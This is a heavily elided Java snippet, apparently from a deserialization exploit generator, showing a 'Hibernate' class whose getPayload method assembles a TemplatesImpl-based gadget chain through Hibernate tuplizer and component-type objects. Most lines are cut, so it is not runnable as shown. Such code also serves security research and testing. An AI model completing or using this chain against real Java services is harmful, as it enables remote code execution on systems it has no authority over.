...
public class Hibernate
{
    public static byte[] getPayload(byte[] bytes) throws Exception {
        ...
        TemplatesImpl tmpl   = getTeml(bytes);
        ...
        AbstractComponentTuplizer tuplizer = (AbstractComponentTuplizer) createInstanceUnsafely(pojoComponentTuplizerClass);
        ...
        Object type = createInstanceUnsafely(componentTypeClass);
